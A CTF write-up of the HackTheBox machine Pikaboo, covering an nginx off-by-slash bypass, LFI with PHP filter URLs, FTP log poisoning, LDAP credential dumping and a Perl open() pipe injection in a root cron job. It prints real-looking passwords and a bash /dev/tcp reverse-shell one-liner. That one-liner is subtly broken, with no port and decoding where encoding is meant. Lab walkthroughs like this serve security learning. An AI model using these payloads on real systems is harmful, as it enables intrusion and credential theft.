---
title: HackTheBox Pikaboo
date: 2021-12-14
categories: [CTF, hackthebox]
tags: [htb, hackthebox, ctf, nmap, http, ldap, ftp, blackhat, orangetsai, parser, nginx, apache, log, logpoisoning, poison, commandinjection, cmdinjection, reverseproxy, proxy, offbyslash,lfi,open_basedir, crontab, cron, csv, perl, ldapsearch, open  ]     # TAG names should always be lowercase

image:
  src: /image/hackthebox/pikaboo/pikabooinfocard.png
  width: 1000   # in pixels
  height: 400   # in pixels
  alt: pikabooinfocard
---

# Machine Information

Pikaboo is extremely fun box to solve. The box starts with enumeration on web server that is hosting nginx but later finding that Apache is running as well. Apache server can be bypassed to find the admin page, which is explained in OrangeTsai's Blackhat talk. After enumerating on the Apache I get to find LFI vulnerability where I can read FTP log file. FTP log file can be poisoned by logging in with PHP code. That's how I am able to get `www-data` user, after getting in the box, there is a crontab running every minute which is executing a bin file. While enumerating more on the machine, I found LDAP and FTP credentials for `pwnmeow` user. Later I ran across one perl command execution vulneability which I will use to get to root.

# Enumeration

## nmap

I have started `nmap` to scan for open ports with version of the running services and running common scripts against them, using `-sV` and `-sC` flags respectively. `nmap` gave me the following results,

```bash
Nmap scan report for 10.10.10.249
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Pikaboo
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.96 seconds
```

All of these versions did not have any exploits listed in `searchsploit`.  I will start `ffuf` in the background while I visit port 80.

## Website

This is the front page of the website. The webiste is about catching the pokatmon.

<img src="/image/hackthebox/pikaboo/01.png" alt="01" style="zoom:67%;" />

There are a lot of pokamon listed in `Pokatdex` page but clicking on them says PokeAPI is yet to be integrated.

<img src="/image/hackthebox/pikaboo/02.png" alt="02" style="zoom:80%;" />

There is nothing on the `Contact` page as well but the `Admin` page is asking for credentials.

<img src="/image/hackthebox/pikaboo/03.png" alt="03" style="zoom:80%;" />

Clicking on `Cancel` revealed Apache Server running on Port 81, So the thing is `nginx` might be running as reverse proxy directing all the traffic from Apache Server to port 80. 

<img src="/image/hackthebox/pikaboo/04.png" alt="04" style="zoom:80%;" />

## Off-by-slash

This misconfiguration in nginx is very subtle, it was founded by [OrangeTsai](https://twitter.com/orange_8361). In his *Breaking parser logic* blackhat session explained the Off-By-Slash vulnerability in nginx. 

> Video: https://www.youtube.com/watch?v=CIhHpkybYsY
>
> Whitepaper: https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf

The Vulnerabilty goes like:

> If in a nginx web configuration file some location is like "location /temp {..}" then it leads to LFI. Developer might think that it will only list files inside `/temp` directory but it actually be abused by `/temp../somefile`. 

I can now bypass the login prompt and visit `admin../server-status`

<img src="/image/hackthebox/pikaboo/05.png" alt="05" style="zoom:67%;" />

I then tried visiting `http://10.10.10.243/admin../admin_staging/`.

<img src="/image/hackthebox/pikaboo/06.png" alt="06" style="zoom:67%;" />

# Getting www-data shell

## LFI vulnerability

Now that I got the admin dashboard I ran `gobuster` against it and it found interesting files.

<img src="/image/hackthebox/pikaboo/08.png" alt="08" style="zoom: 50%;" />

I tried accessing `/etc/passwd` file but was getting error and URI is getting resolved to `http://10.10.10.249/etc/passwd`. I will just visit `info.php` file, I also check other files but they did not have any useful information.

`info.php` file shows why I am unable to access or read `/etc/passwd` or any other folder. 

<img src="/image/hackthebox/pikaboo/07.png" alt="07" style="zoom:150%;" />

`open_basedir` is used to protect files outside mentioned folder. PHP will read files from the given folder and restrict any other files.

-  Official PHP documentation: https://www.php.net/manual/en/ini.core.php#ini.open-basedir
- What is `open_basedir` ? : https://xneelo.co.za/help-centre/website/open_basedir-error/

The left navigation bar is has a URL structure like `10.10.10.249/admin../admin_staging/index.php?page=info.php`, So it might lead to file inclusion vulnerablity. Since it is a php file I used PHP base64 filter and successfully exfiltrated the php files and inspected them. Out of them index.php had an interesting code and why I was able to get files. It is using `include()` function and that is the reason for LFI vulnerability. What include() function does, a developer can include the content of one PHP file into another PHP file using `include()` function.

<img src="/image/hackthebox/pikaboo/13.png" alt="13" style="zoom:80%;" />

## FTP log poisoning

So now I might be able to see other files than this folder but again `open_basedir` is blocking the requests. I ran gobuster again but now using SecList's LFI file and it returned some files but out of them FTP is interesting.

<img src="/image/hackthebox/pikaboo/09.png" alt="09" style="zoom: 50%;" />

I was able to see the file but there is a possiblity that I might miss some characters so I used PHP's base64 filter. The url becomes `http://10.10.10.249/admin../admin_staging/index.php?page=php://filter/convert.base64-encode/resource=/var/log/vsftpd.log`

<img src="/image/hackthebox/pikaboo/10.png" alt="10" style="zoom:80%;" />

This file did not have any credentials in it. I googled for "[FTP log LFI](https://secnhack.in/ftp-log-poisoning-through-lfi/)" and it lead me an interesting log poisoning way to get an reverse shell.

First I login to FTP server using `<?php system("id")?>` and use `password` for password. In the logs I can see `www-data` username printed.

1. <img src="/image/hackthebox/pikaboo/11.png" alt="11" style="zoom:80%;" />

2. <img src="/image/hackthebox/pikaboo/12.png" alt="12" style="zoom: 50%;" />

I used normal bash reverse shell. Entered the payload into FTP user and for password it doesn't really matter as I just have to poison the log file.

<img src="/image/hackthebox/pikaboo/14.png" alt="14" style="zoom:67%;" />

After doing that I reloaded the webpage and on my `nc` listener I got the reverse shell.

<img src="/image/hackthebox/pikaboo/15.png" alt="15" style="zoom:67%;" />

# Getting root shell

I was able to read the `user.txt` file inside pwnmeow user. So I went on searching for any way that could give me the user or way to get the root.

While enumerating inside the apache2 folder I found the admin password, I will save this just in case.

<img src="/image/hackthebox/pikaboo/18.png" alt="18" style="zoom:67%;" />


## finding crontab

Now there is a crontab running every minute as root user.

<img src="/image/hackthebox/pikaboo/16.png" alt="16" style="zoom:67%;" />

Inside the contents of `/usr/local/bin/csvupdate_cron`  

> #!/bin/bash\
>
> for d in /srv/ftp/*\
> do\
>   cd $d\
>   /usr/local/bin/csvupdate $(basename $d) *csv\
>   /usr/bin/rm -rf *\
> done

So the file is doing for loop for every directories inside `/srv/ftp/` directory and moving inside them and executing  `/usr/local/bin/csvupdate` on them creating `*.csv` files and lastly removing all the files.

Looking at the `/usr/local/bin/csvupdate` file,

```perl
#!/usr/bin/perl

##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################

use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv";

my %csv_fields = (
  'abilities' => 4,
  'ability_changelog' => 3,
  'ability_changelog_prose' => 3,
  'ability_flavor_text' => 4,
  'ability_names' => 3,
	....[snip]....
  'type_names' => 3,
  'types' => 4,
  'version_group_pokemon_move_methods' => 2,
  'version_group_regions' => 2,
  'version_groups' => 4,
  'version_names' => 3,
  'versions' => 3
);


if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);

```

In this file if block is checking the number of command-line arguments if the arguments are less than 1 then it throws Usage error. Then it checks if the CSV fields are inside the `csv_fields` and throws error if it doesn't. Each of the folder in `/srv/ftp` is opened by checking with the parameters inside this directory if it matches then it opens an output `.csv` file with handle `$fh`.

`shift` (remove and return) the first value from `@ARGV`, the argument list of your program. so the `.csv` files are cause by this.

`for(<>)` is opening each files and looping them into variable `$_` now `chomp` is removing white trailing from each line.

## pokeapi

The file mentioned usage of `my $csv_dir = "/opt/pokeapi/data/v2/csv";`. Inside the `/opt/pokeapi` directory, there is a `config/settings.py` file, that file has a lot of interesting information such as credentials for LDAP.

``` python
# Production settings
import os
from unipath import Path

PROJECT_ROOT = Path(__file__).ancestor(2)

DEBUG = False

TEMPLATE_DEBUG = DEBUG

ADMINS = (("Paul Hallett", "paulandrewhallett@gmail.com"),)

EMAIL_BACKEND = "django.core.mail.backends.console.EmailBackend"

MANAGERS = ADMINS

BASE_URL = "http://pokeapi.co"

# Hosts/domain names that are valid for this site; required if DEBUG is False
# See https://docs.djangoproject.com/en/1.5/ref/settings/#allowed-hosts
#ALLOWED_HOSTS = [".pokeapi.co", "localhost", "127.0.0.1"]
ALLOWED_HOSTS = ["*"]

TIME_ZONE = "Europe/London"

LANGUAGE_CODE = "en-gb"

SITE_ID = 1

# If you set this to False, Django will make some optimizations so as not
# to load the internationalization machinery.
USE_I18N = True

# If you set this to False, Django will not format dates, numbers and
# calendars according to the current locale.
USE_L10N = True

# If you set this to False, Django will not use timezone-aware datetimes.
USE_TZ = True

# Explicitly define test runner to avoid warning messages on test execution
TEST_RUNNER = "django.test.runner.DiscoverRunner"

SECRET_KEY = "4nksdock439320df*(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"

MIDDLEWARE = [
    "corsheaders.middleware.CorsMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.contrib.sessions.middleware.SessionMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.contrib.auth.middleware.AuthenticationMiddleware",
    "django.contrib.messages.middleware.MessageMiddleware",
    "django.middleware.clickjacking.XFrameOptionsMiddleware",
]

ROOT_URLCONF = "config.urls"

WSGI_APPLICATION = "config.wsgi.application"

DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}

CACHES = {
    "default": {
        "BACKEND": "django_redis.cache.RedisCache",
        "LOCATION": "redis://127.0.0.1:6379/1",
        "OPTIONS": {
            "CLIENT_CLASS": "django_redis.client.DefaultClient",
        },
    }
}

SECRET_KEY = os.environ.get(
    "SECRET_KEY", "ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&2l#"
)

CUSTOM_APPS = (
    "tastypie",
    "pokemon_v2",
)

INSTALLED_APPS = (
    "django.contrib.auth",
    "django.contrib.contenttypes",
    "django.contrib.sessions",
    "django.contrib.sites",
    "django.contrib.admin",
    "django.contrib.humanize",
    "corsheaders",
    "rest_framework",
    "cachalot",
) + CUSTOM_APPS


API_LIMIT_PER_PAGE = 1

TASTYPIE_DEFAULT_FORMATS = ["json"]

CORS_ORIGIN_ALLOW_ALL = True

CORS_ALLOW_METHODS = "GET"

CORS_URLS_REGEX = r"^/api/.*$"

REST_FRAMEWORK = {
    "DEFAULT_RENDERER_CLASSES": ("drf_ujson.renderers.UJSONRenderer",),
    "DEFAULT_PARSER_CLASSES": ("drf_ujson.renderers.UJSONRenderer",),
    "DEFAULT_PAGINATION_CLASS": "rest_framework.pagination.LimitOffsetPagination",
    "PAGE_SIZE": 20,
    "PAGINATE_BY": 20,
}

```

Also the machine has LDAP port open and serving on localhost only. On port 81 apache is running.

<img src="/image/hackthebox/pikaboo/17.png" alt="17" style="zoom: 50%;" />

I used the credentials from `settings.py` file using ldapsearch tool.

```bash
www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -h localhost -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w "J~42%W?PFHl]g" -s base namingContexts
# extended LDIF
#
....[snip]....
# requesting: namingContexts 
#

#
dn:
namingContexts: dc=htb

....[snip]....

# numResponses: 2
# numEntries: 1
```

This gave me DC which is Domain Component for the ldap. I will use this DC in `ldapsearch` query,

```bash
www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -h localhost -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w "J~42%W?PFHl]g" -b "DC=htb"
# extended LDIF
....[snip]....
#

# htb
dn: dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: htb
dc: htb

# admin, htb
dn: cn=admin,dc=htb
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9bWxhdFNUTzJDZjZ6QjdVL2VyOVBUamtBVE5yZnJiVnE=

....[snip]....

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

....[snip]....

# numResponses: 15
# numEntries: 14
```

This query dumped a lot of useful information such as administrator password for LDAP, FTP password for pwnmeow. The password stored on the LDAP server is base64 encoded, its easy to decode it. I got the plain text password for pwnmeow user.

<img src="/image/hackthebox/pikaboo/19.png" alt="19" style="zoom: 67%;" />

I can now login using pwnmeow's credentials on to FTP server.

<img src="/image/hackthebox/pikaboo/20.png" alt="20" style="zoom: 67%;" />

There are lots of file inside the FTP server. 

## Perl Vulnerabilty

Per has a vulnerabilty where `open()` function behavious weirdly, if the file has `|` before the filename then whatever is after the pipe gets executed and if the `|` is after the filename then output is thrown at the STDOUT.

I have to first create files like `amroot.csv` and `amroot.txt` else it doesn't work. I will then upload these files to any random directory. I chose `versions` here.

To see if this works I will ping to my machine and as you can see I got successful ping from `10.10.10.249`.

<img src="/image/hackthebox/pikaboo/21.png" alt="21" style="zoom: 50%;" />

I will now try to get reverse shell.

Using normal bash oneliner wasn't working as it was colliding. So I had to base64 the command and execute that way.

1. Base64 the bash one-liner command `echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5 0>&1'; " | base64 -d `
2. Enter the output from the above command into FTP's terminal as `put`'s argument as you can see **1** in below image 
3. Make sure to start listener as mentioned in **2** step of the image

<img src="/image/hackthebox/pikaboo/22.png" alt="22" style="zoom: 50%;" />

It was a long journey and fun box.
